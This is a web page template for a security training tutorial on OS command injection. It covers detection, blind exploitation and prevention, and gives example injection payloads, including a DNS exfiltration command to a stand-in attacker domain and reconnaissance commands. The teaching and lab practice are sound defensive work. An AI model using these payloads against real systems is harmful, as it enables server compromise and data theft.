@extends('layouts.academy')

@section('title', 'What is OS command injection, and how to prevent it? | Web Security Academy | '.config('app.name'))
@section('legacy_css', '/content/pswebsecacademy.css')

@section('academy_body')
@verbatim
<div class="wrapper-large">
    <div class="container-academy">

        <input class="nav-lhs-toggle-input" type="checkbox" id="nav-lhs-toggle">
        <aside class="nav-lhs" id="tree-nav" tree-nav-version="31">
            <nav class="nav-lhs-scrollable">
                <label class="nav-lhs-toggle-label" for="nav-lhs-toggle"></label>
                

        <a class="nav-back" href="/web-security/all-topics">
            <span class="icon-arrow-head-left"></span>
            Back to all topics
        </a>
        <input type="checkbox" id="nav-main-id">
        <label class="nav-label" for="nav-main-id">
            <span class="icon-arrow-head-down"></span>
        </label>
        <h3>OS command injection</h3>
        <ul>
            <li><a href="/web-security/os-command-injection#what-is-os-command-injection">What is command injection?</a></li>
            <li>
                <input type="checkbox" id="sub-nav-id-1">
                <label for="sub-nav-id-1">
                    <a href="/web-security/os-command-injection#injecting-os-commands">Injecting OS commands</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/os-command-injection#useful-commands">Useful commands</a></li>
                    <li><a href="/web-security/os-command-injection#ways-of-injecting-os-commands">Ways of injecting commands</a></li>
                </ul>
            </li>
            <li>
                <input type="checkbox" id="sub-nav-id-2">
                <label for="sub-nav-id-2">
                    <a href="/web-security/os-command-injection#blind-os-command-injection-vulnerabilities">Blind command injection vulnerabilities</a>
                    <span class="icon-arrow-head-down"></span>
                </label>
                <ul>
                    <li><a href="/web-security/os-command-injection#detecting-blind-os-command-injection-using-time-delays">Detecting</a></li>
                    <li><a href="/web-security/os-command-injection#exploiting-blind-os-command-injection-by-redirecting-output">Exploiting by redirecting output</a></li>
                    <li><a href="/web-security/os-command-injection#exploiting-blind-os-command-injection-using-out-of-band-oast-techniques">Exploiting using out-of-band techniques</a></li>
                </ul>
            </li>
            <li><a href="/web-security/os-command-injection#how-to-prevent-os-command-injection-attacks">Preventing</a></li>
            <li><a href="/web-security/all-labs#os-command-injection">View all OS command injection labs</a></li>
        </ul>
    
            </nav>
        </aside>
        <main>
            



<ul class="breadcrumb-list" itemscope itemtype="http://schema.org/BreadcrumbList"><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/web-security"><span itemprop="name">Web Security Academy</span></a><meta itemprop="position" content="1" /></li><li itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/web-security/os-command-injection"><span itemprop="name">OS command injection</span></a><meta itemprop="position" content="2" /></li></ul>    <div class="section theme-white">

        <h1 class="heading-2">OS command injection</h1><p>
            In this section, we explain what OS command injection is, and describe how vulnerabilities can be detected and exploited. We also show you some useful commands and techniques for different operating systems, and describe how to prevent OS command injection.
        </p><img alt="OS command injection" src="/web-security/images/os-command-injection.svg"><div class="highlightedarea">
            <h4>Labs</h4>
            <p>
                If you're familiar with the basic concepts behind OS command injection vulnerabilities and want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access labs in this topic from the link below.
            </p>

        <ul><li><a href="/web-security/all-labs#os-command-injection">View all OS command injection labs</a></li></ul></div><h2 id="what-is-os-command-injection" chunk-id="1CD2861371B5C78E45AFFE6A5CF5ECC4">What is OS command injection?</h2><div class="container-columns-auto">
            <p cms-metadescription="">
                OS command injection is also known as shell injection. It allows an attacker to execute operating system (OS) commands on the server that is running an application, and typically fully compromise the application and its data. Often, an attacker can leverage an OS command injection vulnerability to compromise other parts of the hosting infrastructure, and exploit trust relationships to pivot the attack to other systems within the organization.
            </p>
        </div><div class="youtube-wrapper text-center"><iframe src="https://www.youtube.com/embed/8PDDjCW5XWw?origin=https://portswigger.net&rel=0" allowfullscreen=""></iframe></div><h2 id="injecting-os-commands" chunk-id="C8EBDDF478D0E5C2C9C015F094C08018">Injecting OS commands</h2><p>
            In this example, a shopping application lets the user view whether an item is in stock in a particular store. This information is accessed via a URL:
        </p><code class="code-scrollable">https://insecure-website.com/stockStatus?productID=381&amp;storeID=29</code><p>
            To provide the stock information, the application must query various legacy systems. For historical reasons, the functionality is implemented by calling out to a shell command with the product and store IDs as arguments:
        </p><code class="code-scrollable">stockreport.pl 381 29</code><p>
            This command outputs the stock status for the specified item, which is returned to the user.
        </p><p id="injecting-os-commands-7Y9A" chunk-id="3945A3185316EC13F7B05546774F25EC">
            The application implements no defenses against OS command injection, so an attacker can submit the following input to execute an arbitrary command:
        </p><code class="code-scrollable">&amp; echo aiwefwlguh &amp;</code><p>
            If this input is submitted in the <code>productID</code> parameter, the command executed by the application is:
        </p><code class="code-scrollable">stockreport.pl &amp; echo aiwefwlguh &amp; 29</code><p>
            The <code>echo</code> command causes the supplied string to be echoed in the output. This is a useful way to test for some types of OS command injection. The <code>&amp;</code> character is a shell command separator. In this example, it causes three separate commands to execute, one after another. The output returned to the user is:
        </p><code class="code-scrollable">Error - productID was not provided
aiwefwlguh
29: command not found</code><p>
            The three lines of output demonstrate that:
        </p><ul>
            <li>
                The original <code>stockreport.pl</code> command was executed without its expected arguments, and so returned an error message.
            </li>
            <li>
                The injected <code>echo</code> command was executed, and the supplied string was echoed in the output.
            </li>
            <li>
                The original argument <code>29</code> was executed as a command, which caused an error.
            </li>
        </ul><p>
            Placing the additional command separator <code>&amp;</code> after the injected command is useful because it separates the injected command from whatever follows the injection point. This reduces the chance that what follows will prevent the injected command from executing.
        </p>@endverbatim@include('partials.widget', ['id' => 'academy-labstatus', 'labId' => '2B08DE150E353DC1C0057519F466A55A0CA4A7901B2469D56EF7D2A80EDDEAA6'])@verbatim<h2 id="useful-commands" chunk-id="2448CAB6EFA2ABAFDC186FE175542CB6">Useful commands</h2><p>
            After you identify an OS command injection vulnerability, it's useful to execute some initial commands to obtain information about the system. Below is a summary of some commands that are useful on Linux and Windows platforms:
        </p><table class="is-nonresponsive-table">
            <tr>
                <th>
                    Purpose of command
                </th>
                <th>
                    Linux
                </th>
                <th>
                    Windows
                </th>
            </tr>
            <tr>
                <td>
                    Name of current user
                </td>
                <td><code>
                    whoami
                </code></td>
                <td><code>
                    whoami
                </code></td>
            </tr>
            <tr>
                <td>
                    Operating system
                </td>
                <td><code>
                    uname -a
                </code></td>
                <td><code>
                    ver
                </code></td>
            </tr>
            <tr>
                <td>
                    Network configuration
                </td>
                <td><code>
                    ifconfig
                </code></td>
                <td><code>
                    ipconfig /all
                </code></td>
            </tr>
            <tr>
                <td>
                    Network connections
                </td>
                <td><code>
                    netstat -an
                </code></td>
                <td><code>
                    netstat -an
                </code></td>
            </tr>
            <tr>
                <td>
                    Running processes
                </td>
                <td><code>
                    ps -ef
                </code></td>
                <td><code>
                    tasklist
                </code></td>
            </tr>
        </table><h2 id="blind-os-command-injection-vulnerabilities">Blind OS command injection vulnerabilities</h2><p>
            Many instances of OS command injection are blind vulnerabilities. This means that the application does not return the output from the command within its HTTP response. Blind vulnerabilities can still be exploited, but different techniques are required.
        </p><p>
            As an example, imagine a website that lets users submit feedback about the site. The user enters their email address and feedback message. The server-side application then generates an email to a site administrator containing the feedback. To do this, it calls out to the <code>mail</code> program with the submitted details:
        </p><code class="code-scrollable">mail -s &quot;This site is great&quot; -aFrom:peter@normal-user.net feedback@vulnerable-website.com</code><p>
            The output from the <code>mail</code> command (if any) is not returned in the application's responses, so using the <code>echo</code> payload won't work. In this situation, you can use a variety of other techniques to detect and exploit a vulnerability.
        </p><h3 id="detecting-blind-os-command-injection-using-time-delays">Detecting blind OS command injection using time delays</h3><p>
            You can use an injected command to trigger a time delay, enabling you to confirm that the command was executed based on the time that the application takes to respond. The <code>ping</code> command is a good way to do this, because lets you specify the number of ICMP packets to send. This enables you to control the time taken for the command to run:
        </p><code class="code-scrollable">&amp; ping -c 10 127.0.0.1 &amp;</code><p>
            This command causes the application to ping its loopback network adapter for 10 seconds.
        </p>@endverbatim@include('partials.widget', ['id' => 'academy-labstatus', 'labId' => '28BDA028C1BA840A8F4FCCAAAD3739FDC8D8E2D195F348C0DB992CBCD6971CBF'])@verbatim<h3 id="exploiting-blind-os-command-injection-by-redirecting-output">Exploiting blind OS command injection by redirecting output</h3><p>
            You can redirect the output from the injected command into a file within the web root that you can then retrieve using the browser. For example, if the application serves static resources from the filesystem location <code>/var/www/static</code>, then you can submit the following input:
        </p><code class="code-scrollable">&amp; whoami &gt; /var/www/static/whoami.txt &amp;</code><p>
            The <code>&gt;</code> character sends the output from the <code>whoami</code> command to the specified file. You can then use the browser to fetch <code>https://vulnerable-website.com/whoami.txt</code> to retrieve the file, and view the output from the injected command.
        </p>@endverbatim@include('partials.widget', ['id' => 'academy-labstatus', 'labId' => '794C7AB29027C16B9A3FAB84326C6F313A8AF27A96F1833828EDD38B26A4ACA7'])@verbatim<h3 id="exploiting-blind-os-command-injection-using-out-of-band-oast-techniques">Exploiting blind OS command injection using out-of-band (OAST) techniques</h3><p>
            You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example:
        </p><code class="code-scrollable">&amp; nslookup kgji2ohoyw.web-attacker.com &amp;</code><p>
            This payload uses the <code>nslookup</code> command to cause a DNS lookup for the specified domain. The attacker can monitor to see if the lookup happens, to confirm if the command was successfully injected.
        </p>@endverbatim@include('partials.widget', ['id' => 'academy-labstatus', 'labId' => '6E6E115E1981AE822B7E41FCACCBC1CB96A5D85B63B42B80E3E6D35565209752'])@verbatim<p>
            The out-of-band channel provides an easy way to exfiltrate the output from injected commands:
        </p><code class="code-scrollable">&amp; nslookup `whoami`.kgji2ohoyw.web-attacker.com &amp;</code><p>
            This causes a DNS lookup to the attacker's domain containing the result of the <code>whoami</code> command:
        </p><code class="code-scrollable">wwwuser.kgji2ohoyw.web-attacker.com</code>@endverbatim@include('partials.widget', ['id' => 'academy-labstatus', 'labId' => '3C2C7DC2A5F53DC680195C18C290E82BC97C28F599414DB388CF8CF96CB72BF5'])@verbatim<h2 id="ways-of-injecting-os-commands">Ways of injecting OS commands</h2><p>
            You can use a number of shell metacharacters to perform OS command injection attacks.
        </p><p>
            A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems:
        </p><ul>
            <li>
                <code class="code-scrollable">&amp;</code>
            </li>
            <li>
                <code class="code-scrollable">&amp;&amp;</code>
            </li>
            <li>
                <code class="code-scrollable">|</code>
            </li>
            <li>
                <code class="code-scrollable">||</code>
            </li>
        </ul><p>
            The following command separators work only on Unix-based systems:
        </p><ul>
            <li>
                <code>;</code>
            </li>
            <li>
                Newline (<code>0x0a</code> or <code>\n</code>)
            </li>
        </ul><p>
            On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:
        </p><ul>
            <li>
                <code class="code-scrollable">` injected command `</code>
            </li>
            <li>
                <code class="code-scrollable">$(injected command)</code>
            </li>
        </ul><p>
            The different shell metacharacters have subtly different behaviors that might change whether they work in certain situations. This could impact whether they allow in-band retrieval of command output or are useful only for blind exploitation.
        </p><p>
            Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using <code>&quot;</code> or <code>'</code>) before using suitable shell metacharacters to inject a new command.
        </p><h2 id="how-to-prevent-os-command-injection-attacks">How to prevent OS command injection attacks</h2><p>
            The most effective way to prevent OS command injection vulnerabilities is to never call out to OS commands from application-layer code. In almost all cases, there are different ways to implement the required functionality using safer platform APIs.
        </p><p>
            If you have to call out to OS commands with user-supplied input, then you must perform strong input validation. Some examples of effective validation include:
        </p><ul>
            <li>
                Validating against a whitelist of permitted values.
            </li>
            <li>
                Validating that the input is a number.
            </li>
            <li>
                Validating that the input contains only alphanumeric characters, no other syntax or whitespace.
            </li>
        </ul><p>
            Never attempt to sanitize input by escaping shell metacharacters. In practice, this is just too error-prone and vulnerable to being bypassed by a skilled attacker.
        </p><div class="highlightedarea">
            <h4>Read more</h4>


        <ul><li><a href="/web-security/all-labs">Find OS command injection vulnerabilities using Burp Suite's web vulnerability scanner</a></li><li><a href="/research/hunting-asynchronous-vulnerabilities">Read SecDevLab Research's writeup of the Hunting Asynchronous Vulnerabilities presentation from 44Con and BSides Manchester</a></li></ul></div>
        
        @endverbatim@include('partials.widget', ['id' => 'academy-registration-footer'])@verbatim
    
    </div>


    
    
    

            
        </main>
    </div>
</div>
@endverbatim
@endsection
